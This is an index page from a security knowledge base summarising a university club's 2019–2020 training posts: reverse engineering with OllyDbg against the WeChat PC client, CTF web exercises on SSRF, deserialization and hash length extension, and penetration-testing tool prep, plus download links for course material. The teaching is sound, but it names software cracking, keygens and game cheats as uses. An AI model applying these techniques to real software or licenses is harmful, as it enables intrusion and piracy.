| **核心工具：OllyDbg (OD)** | 逆向反汇编动态调试分析神器，需提前下载安装并验证可用性；若百度网盘版本不可用，建议搜索"吾爱破解 OD"获取替代版本 | `https://pan.baidu.com/s/1Gk0z399npp_UG3O4Lp5vEw` (提取码: `952s`) |
| **实战靶标：微信 PC 最新版** | 本次动态调试实战的目标程序，需提前安装最新版微信 PC 客户端 | 同网盘链接内提供 |
| **基础知识：汇编语言** | 讲座会覆盖基础汇编，但强烈建议提前自行了解基本指令集、寄存器、栈帧结构等概念，以便跟上实战节奏 | 推荐参考 [[reverse-engineering-beginner-learning-path]] 中汇编入门资源 |
| **概念储备：逆向工程基础认知** | 搜索了解"逆向工程"定义、应用场景、核心工具链，建立初步心智模型 | 参考后续 [2019-11-08 系统性入门文章](#2019-11-08-第七周逆向入门动态调试分析上) |

> **特别提示**："OD尽量早点下好，因为打开的时候可能有这样那样的问题" — 体现 Windows 下调试器兼容性、权限、插件冲突等常见坑点的实战经验。

##### 后续练手安排
- 文章预告后续会在 QQ 群发布用于练手的小程序（CrackMe 类练习题），请成员关注群消息。

#### 培训安排

| 项目 | 内容 |
| :--- | :--- |
| **时间** | 2019-11-02（周六） 21:10 |
| **持续时长** | 1 小时左右 |
| **地点** | 彭康楼（梧桐东门集合） |
| **主讲人** | 文章未明确标注，由 Winny 准备材料 |

#### 训练系列定位对比

| 期数 | 发布日期 | 主题 | 侧重 | 状态 |
| :--- | :--- | :--- | :--- | :--- |
| **第七周·预热（本文）** | 2019-11-02 | CTF逆向入门 OD动态调试入门 | 环境部署、工具验证、靶标准备、基础预习 | ✅ 已发布 |
| **第七周·理论（上）** | 2019-11-08 | 逆向入门&动态调试分析（上） | 概念体系、应用场景、学习路径、推荐资源、方法论 | ✅ [已归档](#2019-11-08-第七周逆向入门动态调试分析上) |
| **第七周·实战（下）** | 待确认 | 逆向入门&动态调试分析（下） | OD 实战演示、动态调试技巧、断点策略、微信逆向案例 | ⏳ 待发布/归档 |
| **第八周** | 2019-11-15 | 服务器渗透萌新培训 | SSH、nmap、dirb、john、Kali 环境 | ✅ [已归档](#2019-11-15-第八周服务器渗透萌新培训预告) |

#### 关联技术生态

- **OllyDbg (OD)**：经典 32 位用户态调试器，插件生态丰富（如 StrongOD、PhantOm、ODBGScript），虽逐渐被 x64dbg 取代，但仍是 32 位程序动态分析教学首选
- **x64dbg / Ghidra / IDA Pro**：现代逆向工程工具链核心三件套，建议入门后尽快迁移学习
- **微信 PC 版逆向**：涉及 Qt 界面框架、自定义加密协议、内存保护机制，是 Windows 逆向进阶的优质实战靶标
- **CTF Reverse 方向**：核心考点含算法还原、加壳脱壳、混淆对抗、虚拟机保护分析、固件/移动端逆向等

---

### 2019-11-08 第七周逆向入门&动态调试分析（上）

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483904&idx=1&sn=0c9f326463da49c6fe31b5c08b004f49&chksm=fcd9c7d1cbae4ec7d3b0c06dd81e8b3fbc6fc4b0a00a300458b52ab708473d8d331785b3e771&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483904&idx=1&sn=0c9f326463da49c6fe31b5c08b004f49&chksm=fcd9c7d1cbae4ec7d3b0c06dd81e8b3fbc6fc4b0a00a300458b52ab708473d8d331785b3e771&scene=27#wechat_redirect)  
> **发布日期**：2019-11-08  
> **作者**：winny（图文）、夜晓（排版）  
> **标签**：#逆向工程 #入门教程 #动态调试 #汇编语言 #C语言 #WindowsAPI #加壳脱壳 #CTF #任务驱动学习 #看雪 #小甲鱼

#### 概述

0w1Club 发布的第七周萌新培训文章，主题为**逆向入门&动态调试分析（上）**。文章由 winny 撰写，夜晓 排版。作为逆向培训系列的第一部分，重点介绍逆向工程的基本概念、应用场景、学习路径与推荐资源，旨在为零基础成员建立逆向工程的整体认知框架，下一章将讲解动态调试实战。

#### 核心内容结构

##### 0x00 什么是逆向工程
- **定义**：引用维基百科定义，逆向工程是对目标产品进行逆向分析研究，演绎其处理流程、组织结构、功能性能规格等设计要素，在无法获得生产信息时从成品分析推导设计原理。
- **本质**：别人将源代码编译链接成可执行程序，逆向则是将可执行程序还原为源代码进行分析、修改。
- **核心场景示例**：破解软件证书验证算法，逆向验证逻辑制作注册机。

##### 0x01 逆向工程的应用场景
| 应用方向 | 说明 |
| :--- | :--- |
| **游戏外挂/软件破解** | 最常见的大众认知场景 |
| **病毒/恶意软件分析** | 分析恶意代码行为、提取 IOC、编写检测规则 |
| **软件汉化/本地化** | 如文中演示：使用 Resource Hacker 修改菜单资源实现界面汉化 |
| **漏洞挖掘** | 二进制漏洞挖掘、Patch 分析、1day/0day 挖掘 |
| **软件知识产权保护** | 防篡改、防调试、代码混淆、虚拟化保护等对抗技术 |
| **CTF 竞技** | Reverse/Pwn 方向核心技能，"被吊着打"也能"拿奖金拿到手软" |

> **汉化实战演示**：文章附带完整图文演示，使用 Resource Hacker 打开程序 → 定位菜单资源 → 修改字符串 → 编译脚本 → 保存生成汉化版本。

##### 0x02 逆向工程学习路径与方法论
- **核心基础（跨平台通用）**：
  - **汇编语言** — 逆向的"绕不开的坎"，虽有 IDA Pro F5 伪代码，但读汇编是基本功
  - **C/C++** — 理解编译后的代码结构、对象模型、虚表、异常处理等
  - **计算机组成原理/操作系统** — 内存管理、调用约定、线程同步、PE/ELF 格式
  - **Windows API 编程** — Windows 平台逆向必备
  - **工具链掌握** — IDA Pro、OllyDbg/x64dbg、Ghidra、Resource Hacker 等
  - **加壳/脱壳技术** — UPX、VMProtect、Themida 等保护壳对抗

- **分支方向差异**：游戏外挂、恶意代码分析、漏洞挖掘、移动端、IoT 固件等各有侧重

- **推荐学习方法：任务驱动型学习**
  > "不要觉得'这么多东西我怎么学得完'，最好的方法就是直接找个小软件，动手开始逆向，遇到问题再学再查，有针对性、更高效、更有动力。"

- **小白起步推荐路线**：
  1. **C 语言**：书籍《C Primer Plus》（第 6 版及以上）
  2. **汇编语言**：书籍 王爽《汇编语言》（第 3/4 版）
  3. **系统性逆向教材**：看雪《加密与解密》（第 3/4 版，经典入门教材）
  4. **视频配套**：B站 UP主 **小甲鱼** "解密系列" — 照着《加密与解密》讲解，免费、有课后练习程序，**极适合入门**
  5. **学习路线参考**：知乎问题 [如何系统地学习逆向工程？](https://www.zhihu.com/question/23999930) （大佬整理的进阶路线图）

- **必备生存技能**：**善用搜索引擎** — "基本上你能遇到的任何问题都能搜到，没有搜不到的，只有还没搜到的"，文中附带百度高级搜索语法技巧图示。

##### 0x03 结语
- 逆向水深、反馈慢、学习曲线陡峭，需要耐心与恒心
- 定位："二进制之于安全，就像数学之于理科" — 底层功夫扎实，后续无论走 PWN、Web、AI 安全、漏洞研究哪个方向，都能事半功倍
- 勉励："沉得下心来，加油，奥利给！"

---

### 2019-11-08 BUU Web 实训预告

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483874&idx=1&sn=a1fc3882feedf37e6a75e2fb97f911ca&chksm=fcd9c433cbae4d25b738e4e446668b8a9fb6420f102b4570e9faef580eff1e14627fc2f61bc6&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483874&idx=1&sn=a1fc3882feedf37e6a75e2fb97f911ca&chksm=fcd9c433cbae4d25b738e4e446668b8a9fb6420f102b4570e9faef580eff1e14627fc2f61bc6&scene=27#wechat_redirect)  
> **发布日期**：2019-11-08  
> **作者**：果果（文）、buu（图）  
> **标签**：#CTF实训 #BUU #Web安全 #SSRF #代码审计 #反序列化 #Phar反序列化 #哈希长度扩展 #CISCN2019 #培训预告

#### 概述

0w1Club 发布的 BUU Web 实训预告文章，安排于 2019-11-08（周五）晚 21:10 在彭康楼（梧桐东门集合）进行，持续约 1 小时。本次实训选取 BUUOJ 平台上的三道经典 Web 题目进行实战讲解，涵盖 SSRF 基础、代码审计与反序列化构造、Phar 反序列化、哈希长度扩展攻击等核心知识点，旨在通过实战演练巩固 Web 安全基础与进阶技巧。

#### 实训题目与知识点

##### 题目一：delta_2019_ssrfme
- **定位**：Web 基础热身题
- **核心考点**：**SSRF (服务端请求伪造)** 基础利用与绕过技巧
- **目的**：夯实 Web 安全基础，为后续题目理解打底

##### 题目二：[CISCN2019 华北赛区 Day1 Web1] Dropbox
- **来源**：CISCN 2019 华北赛区 Day1 Web1
- **难度**：中等
- **核心考点**：
  - **简单代码审计** — 源码阅读与漏洞点定位
  - **反序列化构造** — 构造恶意序列化对象实现利用链
- **关联知识**：[[java-deserialization-fundamentals]] 中的序列化/反序列化基础机制

##### 题目三：CISCN_2019_web_northern_china_day1_web2 IKUN
- **来源**：CISCN 2019 华北赛区 Day1 Web2
- **特点**：趣味性强，贴近实际 Web 应用结构
- **核心考点**：综合运用 Web 攻击技巧，理解真实业务场景下的漏洞挖掘思路

#### 主要知识点详解

| 知识点 | 说明 | 关联技术页面 |
| :--- | :--- | :--- |
| **I. Python 反序列化** | Python `pickle` 模块反序列化漏洞原理、`__reduce__` 魔术方法构造 RCE 链 | [[java-deserialization-fundamentals]] (对比 Java 机制) |
| **II. Phar 反序列化** | PHP Phar 存档文件元数据反序列化特性、`phar://` 协议触发 `__destruct` 等魔术方法、绕过文件操作函数限制 | [[zzzcms-v1.7.5-audit]] (Phar 反序列化利用链实战) |
| **III. 哈希长度扩展攻击** | 基于 Merkle–Damgård 结构哈希函数（MD5、SHA1、SHA256 等）的长度扩展特性，在不知密钥情况下构造合法 `hash(key + message + padding + extension)`，绕过签名验证 | [[jwt漏洞原理与实战利用]] (哈希相关攻击对比) |

#### 实训安排

| 项目 | 内容 |
| :--- | :--- |
| **时间** | 2019-11-08（周五） 21:10 |
| **持续时长** | 1 小时左右 |
| **地点** | 彭康楼（梧桐东门集合） |
| **主讲人** | 文章未明确标注，由 buu 准备题目与图示 |

#### 备注
> 文章原文提示："这次的例会内容整体难度比较大），解题过程容易出现意外，可能出现一些不可预知的错误，如果发生希望大家理解" —— 体现实战演练的真实不确定性。

---

### 2019-11-15 第八周服务器渗透萌新培训预告

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483912&idx=1&sn=a2a9e1025a4cd8d55969675e4c900d25&chksm=fcd9c7d9cbae4ecfbb5de106d8f02a4ed78d844b5637b40346817bcb3aad746eab8c803cd8eb&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483912&idx=1&sn=a2a9e1025a4cd8d55969675e4c900d25&chksm=fcd9c7d9cbae4ecfbb5de106d8f02a4ed78d844b5637b40346817bcb3aad746eab8c803cd8eb&scene=27#wechat_redirect)  
> **发布日期**：2019-11-15  
> **作者**：夜晓  
> **标签**：#服务器渗透 #萌新培训 #SSH #nmap #dirb #john #KaliLinux #靶机环境 #渗透测试入门

#### 概述

0w1Club 发布的第八周萌新培训预告，主题为**服务器渗透**。文章详细列出了参会前建议掌握的前置知识与工具，并提供了靶机环境与攻击机镜像的下载链接，旨在帮助零基础成员快速搭建实验环境，为线下实战分享会做好准备。

#### 培训详情

| 项目 | 内容 |
| :--- | :--- |
| **时间** | 2019-11-15（周五） 21:10 |
| **持续时长** | 1.5 小时左右 |
| **地点** | 彭康楼（梧桐东门集合） |
| **主讲人** | 夜晓 |

#### 课前准备清单

参会前建议了解并熟悉以下工具与协议：

1. **SSH 协议** — 远程登录与管理的基础
2. **nmap** — 端口扫描神器，网络资产发现核心工具
3. **dirb** — Web 目录/文件扫描工具，用于发现隐藏路径
4. **john** — John the Ripper 密码破解工具，离线破解哈希值
5. **Kali Linux** — 专用攻击系统，预装大量渗透测试工具集

#### 环境部署资源

##### 目标靶机（用 VMware 安装）
- **下载地址**：`https://pan.baidu.com/s/1aMtKdwH9EB0n1yixmZLRLA`
- **提取码**：`5d37`

##### Kali Linux 镜像（用 VMware 安装）
- **下载地址**：`https://pan.baidu.com/s/1PMQ9AQXx7rmS2hhU5Ggrjw`
- **提取码**：`6kzx`
- **安装提示**：安装完成后请一定要打开配置环境、换源，操作同 Ubuntu

#### 备注
> 文章配有多张现场照片与二维码，原文末尾附有"我知你在看"互动图片。

---

## 年 02 月 文章详情

### 2020-02-09 学习资料放送第一弹

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483924&idx=1&sn=60264ff339e9d4978875eb8165628792&chksm=fcd9c7c5cbae4ed3f6b8fc2af0908a2bbbba745613532a4273301b860ad21046f15cc5410b42&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483924&idx=1&sn=60264ff339e9d4978875eb8165628792&chksm=fcd9c7c5cbae4ed3f6b8fc2af0908a2bbbba745613532a4273301b860ad21046f15cc5410b42&scene=27#wechat_redirect)  
> **发布日期**：2020-02-09  
> **作者**：夜晓  
> **标签**：#学习资料 #CTF入门 #Web渗透 #代码审计 #视频资源 #PDF资源 #靶机 #思维导图 #百度网盘

#### 概述

0w1Club 发布的第一期学习资料放送，正值 2020 年春节假期延长、开学推迟期间，面向安全入门者整理了三大类实战型学习资源：**CTF 光速入门**、**Web 渗透**、**代码审计**，涵盖视频教程、PDF 文档、OVA 靶机镜像、PNG 思维导图等多种格式，均为百度网盘分享链接，附带提取码。资源来源于社区公开分享，仅供学习交流，建议有经济能力者支持正版。

#### 资源清单

##### CTF 光速入门
- **内容**：
  - CTF 快速入门（视频资源）
  - 网络黑白（PDF 资源）
  - 金融网络攻防大赛实战（视频资源）
  - 常见安全工具使用（视频资源）
- **下载链接**：`https://pan.baidu.com/s/11s9QUfa2zqKb6bJlj_1Ryw`
- **提取码**：`qklx`

##### Web 渗透
- **内容**：
  - Web 靶机渗透（视频资源）
  - Web 靶机渗透配套靶机（OVA 资源，可直接导入虚拟机）
  - 一堆 Web 渗透相关的思维导图（PNG 资源）
- **下载链接**：`https://pan.baidu.com/s/1w0xet700lhwVfkFKM75uRA`
- **提取码**：`9a7r`

##### 代码审计
- **内容**：
  - 安全牛 PHP 代码审计（视频资源）
  - 谷安 PHP 代码审计（PDF 资源）
  - PHP 代码审计脑图（PNG 资源）
  - 代码审计溢出脑图（PNG 资源）
- **下载链接**：`https://pan.baidu.com/s/1o75tCBH16qVcvyw2Mmig0g`
- **提取码**： `tui0`

#### 备注
> 上述资源均为整理者私藏棺材本，数量有限。欢迎投稿其他优质资源，贫穷的整理者或可卖血发小红包答谢。

---

### 2020-02-10 学习资料放送第二弹

> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483937&idx=1&sn=b3173122dbe87d22594b25b0fb9f6773&chksm=fcd9c7f0cbae4ee6b43166e4275cead9a7254a694d1f35a3b4aa2a848a33925568c295ae852b&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483937&idx=1&sn=b3173122dbe87d22594b25b0fb9f6773&chksm=fcd9c7f0cbae4ee6b43166e4275cead9a7254a694d1f35a3b4aa2a848a33925568c295ae852b&scene=27#wechat_redirect)  
> **发布日期**：2020-02-10  
> **作者**：夜晓  
> **标签**：#学习资料 #安卓逆向 #软件逆向 #入门教程 #视频资源 #百度网盘

#### 概述

0w1Club 发布的第二期学习资料放送，面向安全入门者整理了三大类视频教程资源：**安卓逆向**、**软件逆向**、**小白科普**，均为百度网盘分享链接，附带提取码。资源来源于社区公开分享，仅供学习交流，建议有经济能力者支持正版。

#### 资源清单

##### 安卓逆向
- **内容**：
  - i春秋零基础入门安卓逆向（视频）
  - 零基础入门安卓语法与界面（视频）
  - 安卓开发入门（视频）
- **下载链接**：`https://pan.baidu.com/s/1RKiID0P823u4yU6fffgUZw`
- **提取码**：`vpkf`

##### 软件逆向
- **内容**：
  - 爱破解逆向入门教程（视频教材）
  - 吾爱破解论坛破解专用虚拟机
- **下载链接**：`https://pan.baidu.com/s/1LuuDUz1irKcr7RAaxNTesA`
- **提取码**：`3rf1`

##### 小白科普
- **内容**：
  - 中国红客联盟菜鸟零基础入门教程（视频资源）
- **下载链接**：`https://pan.baidu.com/s/1Xjxtbed1rAlW_jlPGg5LKg`
- **提取码**：`ta9u`

#### 备注
> 上述资源均为整理者私藏棺材本，数量有限。欢迎投稿其他优质资源，贫穷的整理者或可卖血发小红包答谢。

---

## 核心专题分类

| 专题方向 | 典型内容 | 关联知识库页面 |
| :--- | :--- | :--- |
| **AI / ML 安全** | 对抗样本生成与检测、模型窃取与水印、数据投毒、AI 模型部署安全、自动驾驶感知安全 | `ai-security` (分类页) |
| **CTF 竞技与 Writeup** | 往年强网杯、CISCN、TCTF、0CTF/TCTF 等赛事复盘；Pwn/Reverse/Web/Crypto/Misc 详细解析 | [[ctftime-writeup-digest-20210325]], [[ctftime-writeup-digest-20210327]], [[diwuzhijian-2020-web-writeup]], [[mtctf-2021-web-writeup]], [[mtctf-2021-crypto-writeup]], [[tctf-2021-1linephp-zip-include]], [[tctf-2021-worldcup-xss-go-ssti]] |
| **漏洞挖掘与分析** | 组件/CMS/框架漏洞代码审计、0day/1day 复现、利用链构造、补丁对比 | [[cve-digest-20200426]], [[cve-digest-20210325]], [[cve-digest-20210326]], [[cve-digest-20210327]], [[cve-digest-20210328]], [[cve-digest-20210330]], [[cve-digest-20210331]], [[cve-digest-20210401]], [[cve-digest-20210402]], [[cve-digest-20210403]], [[cve-digest-20210404]], [[cve-digest-20210406]], [[cve-digest-20210407]], [[cve-digest-20210408]], [[cve-digest-20210413]], [[cve-digest-20210414]], [[cve-digest-20210415]], [[cve-digest-20210416]], [[cve-digest-20210420]], [[cve-digest-20210422]], [[cve-digest-20210423]], [[cve-digest-20210426]], [[cve-digest-20210506]], [[cve-digest-20210513]], [[ecshop-414-sql-injection-analysis]], [[zzzcms-v1.7.5-audit]], [[zzzphp-sql-injection-analysis]], [[zzzphp-cve-2021-32605-rce]], [[apt-c-08-mobile-attack-analysis]], [[cmseasy-7.3.8-code-audit]], [[h2-console-jndi注入rce利用]], [[jd-freefuck-panel-rce-analysis]], [[knob-bluetooth-bredr-key-negotiation-vulnerability]], [[mercedes-benz-mbux-vulnerabilities-2021]], [[secquan-bugwarning-1071987-device-credential-leak]], [[spring-boot-actuator配置不当rce利用]], [[spring-boot-devtools-deserialization-rce]], [[spring-boot-spel表达式注入]], [[spring-cloud-config目录穿越漏洞]], [[wechat-pc-v8-rce-0day-analysis]], [[xmind-xss-to-rce-vulnerability]], [[java-urlconnection-ssrf-protocol-bypass]] |
| **二进制与逆向** | 内核漏洞利用、浏览器引擎漏洞、移动端逆向、混淆对抗、固件分析 | [[java-deserialization-fundamentals]], [[docker-container-security-fundamentals]], [[frp内网渗透应用]] |
| **安全工程与工具** | 自动化 Fuzzing 平台、漏洞扫描器开发、C2 框架改造、红队基建、容器/云原生安全 | [[hvv-2021-vulnerability-collection]], [[elastic-stack-vulnerabilities-may2021]] |
| **威胁情报与 APT** | APT 组织溯源、恶意样本家族分析、C2 基础设施追踪、在野攻击活动复盘 | [[apt-c-08-mobile-attack-analysis]], [[daily-security-digest-20191220]], [[daily-security-digest-20191223]] |
| **Web 安全进阶** | 逻辑漏洞挖掘、反序列化链挖掘、SSTI/CSTI、新特性攻击面、WAF 绕过技巧 | [[jwt漏洞原理与实战利用]], [[tctf-2021-worldcup-xss-go-ssti]] |
| **渗透测试基础** | 服务器渗透入门、SSH/端口扫描/目录扫描/密码破解工具链、Kali Linux 环境搭建 | [[frp内网渗透应用]], [[docker-container-security-fundamentals]] |
| **逆向工程入门** | 逆向概念、汇编/C++/Windows API 基础、工具链、加壳脱壳、任务驱动学习法、经典教材与视频资源 | [[0w1club-wechat-archive-201908-202207#2019-11-02-第七周-ctf-逆向入门-od-动态调试培训预告]], [[0w1club-wechat-archive-201908-202207#2019-11-08-第七周逆向入门动态调试分析上]] |
| **Web 安全入门** | CTF Web 学习引导、Burp Suite 实战、HTTP 协议分析、BUUOJ 实训、SSRF/代码审计/反序列化/Phar/哈希扩展攻击 | [[0w1club-wechat-archive-201908-202207#2019-10-11-第五周-网站结构与-http-协议分析培训预告]], [[0w1club-wechat-archive-201908-202207#2019-10-24-网站结构与-http-协议分析上]], [[0w1club-wechat-archive-201908-202207#2019-10-26-第六周-ctf-web-学习引导培训预告]], [[0w1club-wechat-archive-201908-202207#2019-11-08-buu-web-实训预告]] |
| **建站与 HTTP 分析** | LAMP 环境搭建、WordPress 部署、Apache/MySQL/PHP 配置、HTTP 协议基础、Burp Suite 入门 | [[0w1club-wechat-archive-201908-202207#2019-10-11-第五周-网站结构与-http-协议分析培训预告]], [[0w1club-wechat-archive-201908-202207#2019-10-24-网站结构与-http-协议分析上]] |
| **二进制利用入门** | ROP 攻击原理、栈溢出利用、Shellcode 构造、ret2libc、GDB/GEF 调试、Core Dump 地址泄露、保护机制绕过 | [[0w1club-wechat-archive-201908-202207#2019-10-11-rop从入门到放弃]], [[rop-linux-x86-beginner-tutorial]] |

---

## 同期关联归档 (交叉引用)

同一时间跨度内，知识库已整理的其他安全团队/社区公开归档，可作为对比参考与补充检索：

- **友邻团队归档**：[[0th3rs-security-team-wechat-archive-201911-202204]] —— 0th3rs 安全团队 2019.11-2022.04 微信文章索引 (启明星辰杯战报、TCTF 参赛宣言等)
- **每日安全看点系列** (覆盖 2019.11-2020.03 高频每日资讯)：
  - 2019.11: [[daily-security-digest-20191120]], [[daily-security-digest-20191121]], [[daily-security-digest-20191122]], [[daily-security-digest-20191123]], [[daily-security-digest-20191125]], [[daily-security-digest-20191126]], [[daily-security-digest-20191127]], [[daily-security-digest-20191128]], [[daily-security-digest-20191129]]
  - 2019.12: [[daily-security-digest-20191202]], [[daily-security-digest-20191203]], [[daily-security-digest-20191204]], [[daily-security-digest-20191205]], [[daily-security-digest-20191206]], [[daily-security-digest-20191209]], [[daily-security-digest-20191210]], [[daily-security-digest-20191211]], [[daily-security-digest-20191212]], [[daily-security-digest-20191216]], [[daily-security-digest-20191217]], [[daily-security-digest-20191218]], [[daily-security-digest-20191219]], [[daily-security-digest-20191220]], [[daily-security-digest-20191223]], [[daily-security-digest-20191224]], [[daily-security-digest-20191225]], [[daily-security-digest-20191226]], [[daily-security-digest-20191227]], [[daily-security-digest-20191230]]
  - 2020.01: [[daily-security-digest-20200102]], [[daily-security-digest-20200103]], [[daily-security-digest-20200113]], [[daily-security-digest-20200114]], [[daily-security-digest-20200115]], [[daily-security-digest-20200117]], [[daily-security-digest-20200120]], [[daily-security-digest-20200121]], [[daily-security-digest-20200122]]
  - 2020.02: [[daily-security-digest-20200210]], [[daily-security-digest-20200211]], [[daily-security-digest-20200212]], [[daily-security-digest-20200213]], [[daily-security-digest-20200214]], [[daily-security-digest-20200217]], [[daily-security-digest-20200218]], [[daily-security-digest-20200220]], [[daily-security-digest-20200221]], [[daily-security-digest-20200224]], [[daily-security-digest-20200225]], [[daily-security-digest-20200226]], [[daily-security-digest-20200227]]
  - 2020.03: [[daily-security-digest-20200302]], [[daily-security-digest-20200303]], [[daily-security-digest-20200304]], [[daily-security-digest-20200306]], [[daily-security-digest-20200309]], [[daily-security-digest-20200311]], [[daily-security-digest-20200312]], [[daily-security-digest-20200316]], [[daily-security-digest-20200317]], [[daily-security-digest-20200318]]
- **专题专项归档**：
  - 远程办公安全专题: [[remote-work-security-covid19-20200210]]
  - CVE 按日聚合: 见上表「漏洞挖掘与分析」关联列表

---

## 使用说明

1. **索引定位**：点击上方「时间轴导航」年月链接可快速定位至对应月份文章列表。
2. **专题检索**：通过「核心专题分类」表格中的关联页面跳转至结构化知识页，获取深度技术解析。
3. **横向对比**：利用「同期关联归档」对比不同时间源的技术热点演变 (如 Log4j2、Exchange、Confluence 等重大漏洞的社区反应时差)。
4. **社团画像参考**：文首「社团画像」板块基于 2022 招新文章提炼，可作为了解 0w1Club 定位、培养体系、产学研合作模式的快速参考。
5. **持续更新**：本索引为动态维护页面，后续将补全具体文章标题、发布日期、原文链接及标签体系。

---

## 数据维护记录

| 版本 | 日期 | 维护人 | 变更摘要 |
| :--- | :--- | :--- | :--- |
| 1.0 | 2022-07-31 | 知识库策展人 | 初始化索引框架，确立时间范围、专题分类与交叉引用体系 |
| 1.1 | 2026-11-13 | 知识库策展人 | 合并 2022 招新宣传文章，新增「社团画像」板块，完善 2022.02 月份条目，更新交叉引用与标签 |
| 1.2 | 2026-11-13 | 知识库策展人 | 新增 2020-02-10 学习资料放送第二弹详细条目，收录安卓逆向、软件逆向、小白科普三类入门视频资源链接；更新时间轴导航 2020 年 02 月状态 |
| 1.3 | 2026-11-13 | 知识库策展人 | 新增 2020-02-09 学习资料放送第一弹详细条目，收录 CTF 入门、Web 渗透、代码审计三类视频/PDF/靶机/思维导图资源链接；更新时间轴导航 2020 年 02 月状态，调整两期资料放送顺序 |
| 1.4 | 2026-11-13 | 知识库策展人 | 新增 2019-11-15 第八周服务器渗透萌新培训预告条目，记录 SSH、nmap、dirb、john、Kali Linux 等前置工具与靶机环境准备详情；更新时间轴导航 2019 年 11 月状态，新增「渗透测试基础」专题分类 |
| 1.5 | 2026-11-13 | 知识库策展人 | 新增 2019-11-08 第七周逆向入门&动态调试分析（上）条目，详细记录逆向工程定义、应用场景（破解、外挂、病毒分析、汉化、CTF）、学习路径（汇编、C/C++、Windows API、加壳脱壳）、推荐资源（C Primer Plus、王爽汇编语言、看雪加密与解密、小甲鱼B站视频、知乎学习路线）及任务驱动型学习方法论；更新时间轴导航 2019 年 11 月状态，新增「逆向工程入门」专题分类，完善训练系列定位表 |
| 1.6 | 2026-11-13 | 知识库策展人 | 新增 2019-11-08 BUU Web 实训预告条目，详细记录三道实训题目（delta_2019_ssrfme、CISCN2019 Dropbox、CISCN2019 IKUN）及核心知识点（SSRF、代码审计、Python反序列化、Phar反序列化、哈希长度扩展攻击），关联 Java 反序列化基础、zzzcms Phar 利用链、JWT 哈希攻击等技术页面；更新时间轴导航、标签体系与专题分类表 |
| 1.7 | 2026-11-13 | 知识库策展人 | 新增 2019-11-02 第七周 CTF 逆向入门 OD 动态调试培训预告条目，详细记录 OllyDbg 环境配置、汇编基础预习建议、微信 PC 版逆向靶标准备、QQ 群后续练手安排等实战前置指引，完善第七周训练系列三阶段定位对比表（预热/理论/实战），关联逆向工程入门学习路径页面；更新时间轴导航 2019 年 11 月状态、标签体系（新增 OllyDbg、微信PC版）与专题分类表 |
| 1.8 | 2026-11-13 | 知识库策展人 | 新增 2019-10-26 第六周 CTF Web 学习引导培训预告条目，详细记录 Burp Suite 预习建议、CTF 竞赛形式认知建立、Web 安全学习路线分享会安排及资料分发预告，完善训练系列六至八周定位对比表，新增「Web 安全入门」专题分类，更新标签体系（新增 Burp Suite、Web安全、学习路线、HTTP分析）；更新时间轴导航 2019 年 10 月状态 |
| 1.9 | 2026-11-13 | 知识库策展人 | 新增 2019-10-24 网站结构与 HTTP 协议分析（上）条目，详细记录 LAMP 环境搭建全过程（Apache+PHP+MySQL 安装配置、WordPress 部署、数据库初始化）、CMS 选型理由、HTTP 协议与 Burp Suite 后续分析预告，完善 10 月训练系列定位对比表（技术基础/预热/第七周/第八周），新增「建站与 HTTP 分析」专题分类，更新标签体系（新增 LAMP、WordPress、Apache、MySQL、PHP、HTTP协议、建站教程）；更新时间轴导航 2019 年 10 月状态 |
| 2.0 | 2026-11-13 | 知识库策展人 | 新增 2019-10-11 第五周网站结构与 HTTP 协议分析培训预告条目，补全训练周次序列（第五周预热 → 技术基础落地 → 第六周引导 → 第七周逆向/Web并行 → 第八周渗透），详细记录网站基本结构认知、Apache/MySQL/WordPress 预习、Burp Suite 工具准备、博客搭建演示与 HTTP 抓包入门两大核心议程；更新时间轴导航 2019 年 10 月状态、训练系列定位对比表、标签体系与专题分类交叉引用 |
| 2.1 | 2026-11-13 | 知识库策展人 | **新增 2019-10-11 ROP从入门到放弃技术分享条目**，记录社团创始人 ya0guang 从零学习 ROP 的完整实战笔记：栈溢出原理、x86/x64 参数传递差异、ASLR/NX/PIE/Canary 保护机制、GEF pattern 偏移定位、Shellcode 解析与构造、Core Dump 栈地址泄露绕过 ASLR、Pwntools 自动化利用全流程；关联 [[rop-linux-x86-beginner-tutorial]] 系统化教程与 [[reverse-engineering-beginner-learning-path]] 任务驱动学习法，新增「二进制利用入门」专题分类，完善 10 月训练系列双轨并行（Web 预热 + PWN 技术分享）的培养体系全景；更新标签体系（新增 ROP、二进制利用、栈溢出、Shellcode、GEF、Pwntools、ret2libc） |
| 2.2 | TBD | - | 导入 2019.08-2022.07 全量文章元数据 (标题/链接/日期/摘要) |
| 2.3 | TBD | - | 完成按月/按专题双维度导航页生成 |
| 2.4 | TBD | - | 接入全文检索与标签云聚合功能 |

> **提示**：若您手持 0w1Club 历史文章合集 (HTML/PDF/Markdown)，欢迎通过 PR 或 Issue 协助补全数据源，共建安全知识图谱。

## 来源

- [0w1Club-201908-202207_14](../sources/0w1Club-201908-202207_14.md)
- [0w1Club-201908-202207_15](../sources/0w1Club-201908-202207_15.md)
